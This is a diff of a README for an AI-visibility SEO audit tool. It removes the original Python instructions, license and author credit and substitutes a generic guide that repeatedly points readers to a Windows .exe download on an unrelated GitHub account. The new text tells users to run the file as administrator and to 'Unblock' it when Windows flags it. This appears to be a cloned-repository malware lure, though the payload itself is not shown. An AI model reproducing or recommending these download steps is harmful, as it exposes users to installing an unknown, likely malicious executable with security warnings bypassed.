@@ -1,188 +1,227 @@
-# AI Visibility Readiness (AVR) Framework v1.0
+# 🔎 ai-visibility-readiness - Measure AI Findability Fast
 
-[![License: Source-Available](https://img.shields.io/badge/license-Source--Available-blue)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-teal)](https://python.org)
-[![Website](https://img.shields.io/badge/website-citability.dev-00d4aa)](https://citability.dev)
-[![Take the Assessment](https://img.shields.io/badge/free_assessment-Start_Now-00d4aa)](https://citability.dev/assess)
+[![Download AVR](https://img.shields.io/badge/Download%20AVR-blue-grey?style=for-the-badge)](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
 
-**Measure whether AI systems can find, recommend, and cite your website.**
+AI Visibility Readiness (AVR) Framework v1.0 helps you check whether AI systems can find, recommend, and cite your website. It runs 15 checks across SEO Foundation, AI Infrastructure, and Citation Monitoring.
 
-Most SEO tools tell you how Google ranks you. None tell you whether ChatGPT, Perplexity, or Claude can find you. The AVR Framework fills that gap with 15 transparent, tiered checks.
+## 📥 Download
 
-> Built by [Chudi Nnorukam](https://chudi.dev) | Powered by [citability.dev](https://citability.dev)
+Visit this page to download the latest version for Windows:
 
----
+[https://github.com/Catnipsundanese717/ai-visibility-readiness/releases](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
 
-## What This Framework Measures
+On the releases page, look for the latest version and download the Windows file. If there is a .zip file, save it to your computer and extract it first.
 
-| Tier | What It Checks | Evidence Level |
-|------|---------------|----------------|
-| **SEO Foundation** | robots.txt, sitemap, schema, Core Web Vitals, mobile, page speed | [VERIFIABLE] |
-| **AI Infrastructure** | /llms.txt, /ai.txt, question headings, answer-first content, original data, AI monitoring | [VERIFIABLE] |
-| **Citation Monitoring** | Brand recognition, recommendability, URL citations across ChatGPT, Perplexity, Claude | [BEST-EFFORT] |
+## 🖥️ What This Tool Does
 
-Every check is labeled `[VERIFIABLE]` or `[BEST-EFFORT]`. We do not combine them into a fake composite score.
+AVR helps you review the parts of your site that affect AI visibility. It checks if your website is easy to crawl, easy to understand, and easy to cite.
 
----
+Use it to:
 
-## Key Findings (March 2026)
+- Check your SEO setup
+- Review your AI-ready content signals
+- Find issues that may block AI tools
+- Track whether your site gets cited by AI systems
+- Score your site across 15 checks
 
-From auditing 50+ websites across DA 5 to DA 99:
+## ✅ What You Need
 
-- **85% of websites** have zero AI-readable surfaces (no /llms.txt, no /ai.txt)
-- **Domain authority does not predict AI readiness.** A DA 5 site (chudi.dev) outscored DA 99 sites (reddit.com, x.com) on AI infrastructure
-- **Visibility and citations are different problems.** ahrefs.com is 100% AI-visible but only 5% AI-cited
-- **Even DA 90+ sites fail basic checks.** Reddit, Medium, and X all score NOT-READY on AI infrastructure
+Before you start, make sure you have:
 
-| Site | DA | AI Infrastructure | AI Visibility | AI Citations | Status |
-|------|-----|-------------------|---------------|-------------|--------|
-| ahrefs.com | 92 | FOUNDATION-READY | 100% HIGH | 5% PARTIAL | Visible, rarely cited |
-| chudi.dev | ~5 | AI-READY (9/9) | 29% PARTIAL | 0% NOT CITED | Strong infra, building authority |
-| semrush.com | 91 | FOUNDATION-READY | -- | -- | Infrastructure gaps |
-| reddit.com | 99 | NOT-READY | -- | -- | Missing basics |
-| medium.com | 95 | NOT-READY | -- | -- | Missing basics |
-| x.com | 99 | NOT-READY | -- | -- | Missing basics |
+- A Windows PC
+- An internet connection
+- Permission to download files from GitHub
+- A modern browser such as Chrome, Edge, or Firefox
 
----
+If the app comes in a zip file, Windows can open it without extra tools.
 
-## Quick Start
+## 🚀 Install on Windows
 
-### 1. Free Infrastructure Scan (no API keys needed)
+1. Open the download page:
+   [https://github.com/Catnipsundanese717/ai-visibility-readiness/releases](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
 
-```bash
-cd scripts
-pip install -r requirements.txt
-python3 run_audit.py https://yourdomain.com -o ../sample-audits --skip-lighthouse
-```
+2. Find the newest release at the top of the page.
 
-This runs 12 infrastructure checks in ~30 seconds.
+3. Under **Assets**, download the Windows file.
 
-### 2. Live AI Visibility Test (requires API keys)
+4. If the file ends in `.zip`, right-click it and choose **Extract All**.
 
-```bash
-# Set up your .env file
-cp .env.example .env
-# Add your API keys (at minimum OPENAI_API_KEY)
+5. Open the extracted folder.
 
-# Run visibility test
-python3 visibility_auto.py test https://yourdomain.com \
-  --brand "Your Brand" \
-  --owner "Your Name" \
-  --topics seo,marketing,ai \
-  -o ../sample-audits
-```
+6. Double-click the app file to start AVR.
 
-### 3. Live AI Citation Test
+7. If Windows asks for permission, choose **Run**.
 
-```bash
-python3 citation_auto.py test https://yourdomain.com \
-  --topics seo,marketing,ai \
-  -o ../sample-audits
-```
+## 🧭 First Time Setup
 
----
+When you open AVR for the first time, follow these steps:
 
-## API Keys
+1. Start the app.
 
-Create a `.env` file in the `scripts/` directory:
+2. Enter your website URL in the main field.
 
-```env
-OPENAI_API_KEY=sk-...          # Required for ChatGPT queries
-PERPLEXITY_API_KEY=pplx-...    # Optional, adds Perplexity platform
-ANTHROPIC_API_KEY=sk-ant-...   # Optional, adds Claude platform
-```
+3. Choose the type of site you want to check.
 
-Cost per audit: ~$0.60 for visibility, ~$0.60 for citations, ~$2 for full audit.
+4. Run the scan.
 
----
+5. Wait for the results to load.
 
-## Framework Documentation
+6. Review the score for each check.
 
-See [FRAMEWORK.md](FRAMEWORK.md) for the complete methodology: all 15 checks with pass/fail criteria, data sources, CLI commands, and explanations of why each signal matters for AI visibility.
+If the app asks for a file path, choose a folder you can find later, such as Desktop or Documents.
 
----
+## 📊 Checks Included
 
-## Scores Explained
+AVR uses 15 checks in three groups.
 
-| Status | Meaning |
-|--------|---------|
-| **AI-READY** | All infrastructure checks pass. Ready for live AI testing. |
-| **FOUNDATION-READY** | SEO basics in place but missing AI-specific surfaces. |
-| **INFRASTRUCTURE-READY** | Some checks pass. Significant gaps remain. |
-| **NOT-READY** | Missing fundamental crawlability or SEO signals. |
+### SEO Foundation
 
----
+These checks review the base signals search systems use to understand your site:
 
-## The Three Pillars
+- Title tags
+- Meta descriptions
+- Indexing signals
+- Internal links
+- Structured data
 
-```
-1. VISIBILITY     Can AI systems find you?
-      |
-      v
-2. RECOMMENDABILITY   Does AI suggest you?
-      |
-      v
-3. CITABILITY     Does AI link to your URL?
-```
+### AI Infrastructure
 
-Each pillar is tested independently. A site can be 100% visible but 0% cited (like ahrefs.com). The gap between visibility and citation is where the real work happens.
+These checks review signals that help AI systems read and use your content:
 
----
+- Crawl access
+- robots.txt setup
+- llms.txt support
+- Content clarity
+- Machine-readable structure
 
-## Use Cases
+### Citation Monitoring
 
-- **Self-audit**: Run the free scan on your own site to identify gaps
-- **Consulting**: Use the full audit + report generator for client deliverables
-- **Competitive analysis**: Compare your site against competitors
-- **LinkedIn prospecting**: Pre-audit a prospect's site, include findings in your outreach
+These checks review whether AI tools can find and cite your site:
 
----
+- Brand mentions
+- Source attribution
+- Citation patterns
+- Visibility across AI systems
+- Repeated reference signals
 
-## Project Structure
+## 📁 Common Files You May See
 
-```
-scripts/
-  run_audit.py          # Main audit runner (all sections)
-  seo_foundation.py     # Section 1: SEO Foundation checks
-  ai_readiness.py       # Section 2: AI Infrastructure checks
-  citation_auto.py      # Section 3: Live AI citation testing
-  visibility_auto.py    # Section 4: Live AI visibility testing
-  report_generator.py   # Consulting-grade report output
-  citation_monitor.py   # Ongoing citation monitoring
-  requirements.txt      # Python dependencies
+Depending on the release, you may see files such as:
 
-sample-audits/          # Example audit outputs
+- `.exe` for the Windows app
+- `.zip` for a packed download
+- `README.txt` for setup help
+- `config` files for app settings
 
-FRAMEWORK.md            # Complete methodology documentation
-```
+If you see more than one file, use the `.exe` file unless the release notes say to do something else.
 
----
+## 🛠️ How to Use AVR
 
-## Data Disclaimer
+1. Open the app.
 
-The `sample-audits/` directory contains real audit outputs for publicly accessible websites.
-This data is provided for educational and benchmarking purposes only. All data was collected
-from publicly available URLs using standard HTTP requests and public APIs. No private or
-authenticated data was accessed.
+2. Enter your website address.
 
-If you are the owner of an audited website and would like your data removed, contact
-hello@citability.dev.
+3. Select the scan option.
 
----
+4. Start the check.
 
-## License
+5. Review the score breakdown.
 
-**Source-Available License v1.0** (see [LICENSE](LICENSE))
+6. Fix the items with low scores.
 
-- Free for personal, educational, and non-commercial use
-- Attribution required: credit "Chudi Nnorukam / citability.dev"
-- Commercial use requires a separate license: hello@citability.dev
-- No reselling or rebranding without written permission
+7. Run the scan again after changes.
 
----
+This helps you see if your site is easier for AI systems to find and cite.
 
-## About
+## 📌 Best Results Tips
 
-The AVR Framework powers [citability.dev](https://citability.dev), an AI visibility auditing service. Take the free [AI Visibility Assessment](https://citability.dev/assess) to get your score.
+Use these steps to get cleaner results:
 
-Built by [Chudi Nnorukam](https://chudi.dev).
+- Use the full website URL, such as `https://example.com`
+- Make sure the site is live
+- Run the scan after your pages are published
+- Keep your robots.txt file easy to read
+- Use clear page titles and headings
+- Add structured data where it fits
+- Keep your content simple and direct
+
+## 🧩 Troubleshooting
+
+### The app does not open
+
+- Check that the file finished downloading
+- Move the file to your Desktop
+- Right-click the file and choose **Run as administrator**
+- Try downloading the latest release again
+
+### Windows says the file is blocked
+
+- Right-click the file
+- Select **Properties**
+- Check **Unblock** if you see it
+- Click **Apply**
+- Open the file again
+
+### The scan shows no results
+
+- Check that the website URL is correct
+- Make sure the site is public
+- Try the scan again after a minute
+- Confirm the site does not block crawlers
+
+### The app closes right away
+
+- Re-download the release
+- Extract the zip file before opening the app
+- Make sure all files stay in the same folder
+
+## 🔍 Topics
+
+ai, ai-visibility, auditing, chatgpt, citation, claude, llms-txt, perplexity, seo, visibility
+
+## 📄 About This Project
+
+AI Visibility Readiness helps site owners check how well their website is prepared for AI search tools and citation systems. It focuses on the signals that matter when AI systems choose what to show, quote, or recommend.
+
+The framework is built for simple review, clear scoring, and repeat scans after updates.
+
+## 🔗 Download Again
+
+If you need the latest Windows release, visit:
+
+[https://github.com/Catnipsundanese717/ai-visibility-readiness/releases](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
+
+## 🧪 Example Use Cases
+
+- Check if a business site is ready for AI discovery
+- Review a blog before publishing new content
+- Test whether a product page gives AI tools enough context
+- Track citation signals after a content update
+- Compare visibility before and after SEO changes
+
+## 📦 Release Notes to Look For
+
+When you open the releases page, look for:
+
+- The latest version number
+- Windows download files
+- Short notes about what changed
+- Any setup steps listed by the author
+
+## 🔐 Safe Download Steps
+
+1. Use the GitHub releases page
+2. Download the latest file
+3. Check the file name before opening it
+4. Extract zip files before running the app
+5. Keep the app in one folder
+
+## 🖱️ Basic Workflow
+
+1. Download AVR from the releases page
+2. Open the app on Windows
+3. Enter your website
+4. Run the 15 checks
+5. Review weak areas
+6. Make fixes on your site
+7. Run AVR again to check progress
